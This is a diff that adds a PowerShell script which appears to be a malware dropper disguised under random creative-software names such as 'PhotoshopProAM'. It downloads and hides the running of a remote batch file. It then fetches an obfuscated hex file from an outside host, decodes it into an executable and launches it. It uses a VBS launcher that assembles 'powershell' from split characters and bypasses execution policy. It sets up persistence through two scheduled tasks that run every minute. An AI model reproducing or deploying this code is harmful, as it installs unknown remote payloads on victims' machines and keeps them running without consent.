@@ -1,0 +1,60 @@
+$programs = @(
+    "PhotoshopProAM", "IllustratorXAM", "PremiereEditAM", "AfterEffectsAM",
+    "Blender3DAM", "Maya3DAM", "ZBrushSculptAM", "DaVinciResolveAM",
+    "CorelDrawXAM", "Cinema4DAM", "LightroomXAM"
+)
+$paths = @("$env:AppData\", "C:\ProgramData\")
+$randomProgram = Get-Random -InputObject $programs
+$randomPath = Get-Random -InputObject $paths
+$fullPath = "$randomPath$randomProgram"
+New-Item -Path $fullPath -ItemType Directory -Force | Out-Null
+
+$ContentPS = @'
+$batUrl = "https://github.com/ibrahem1012/WindowsExplorer/raw/refs/heads/main/windowsexploor.bat"
+$batPath = "$env:TEMP\$randomProgram.bat"
+(New-Object Net.WebClient).DownloadFile($batUrl, $batPath)
+Start-Process -FilePath $batPath -WindowStyle Hidden -Wait
+Remove-Item -Path $batPath -Force
+$u = "https://bamcard.ba/hex1.txt"
+$f = "$fullPath\hex.txt"
+(New-Object Net.WebClient).DownloadFile($u, $f)
+$h = Get-Content $f -Raw
+$h = $h.Replace('$','0').Replace('^','1').Replace('#','4') -replace '[^0-9A-Fa-f]', ''
+if ($h.Length % 2 -ne 0) {
+    $h = $h.Substring(0, $h.Length - 1)
+}
+$b = [byte[]]@(for ($i = 0; $i -lt $h.Length; $i += 2) {
+    [convert]::ToByte($h.Substring($i, 2), 16)
+})
+$t = "$env:TEMP\$randomProgram.exe"
+[IO.File]::WriteAllBytes($t, $b)
+Start-Process $t
+'@
+[IO.File]::WriteAllText("$fullPath\$randomProgram.ps1", $ContentPS)
+Start-Sleep -Seconds 2
+
+$ContentVBS = @"
+On Error Resume Next
+Dim arr, cmd
+arr = Split("p,o,w,e,r,s,h,e,l,l", ",")
+cmd = Join(arr, "")
+cmd = cmd & " -ExecutionPolicy Bypass -NoProfile -File ""$fullPath\$randomProgram.ps1"""
+CreateObject("WScript.Shell").Run cmd, 0, False
+"@
+[IO.File]::WriteAllText("$fullPath\$randomProgram.vbs", $ContentVBS)
+Start-Sleep -Seconds 2
+
+try {
+    $EASTNOD1 = New-ScheduledTaskAction -Execute "wscript.exe" -Argument "`"$fullPath\$randomProgram.vbs`""
+    $trigger1 = New-ScheduledTaskTrigger -Once -At (Get-Date).AddMinutes(1) -RepetitionInterval (New-TimeSpan -Minutes 1)
+    Register-ScheduledTask -Action $EASTNOD1 -Trigger $trigger1 -TaskName "$randomProgram" -Force
+} catch {}
+
+Start-Sleep 2
+$taskName2 = "${randomProgram}Startup"
+$scriptPath = "`"$fullPath\$randomProgram.vbs`""
+try {
+    schtasks /create /tn "$taskName2" /tr $scriptPath /sc MINUTE /mo 1 /f
+} catch {}
+
+Start-Process "wscript.exe" "`"$fullPath\$randomProgram.vbs`""
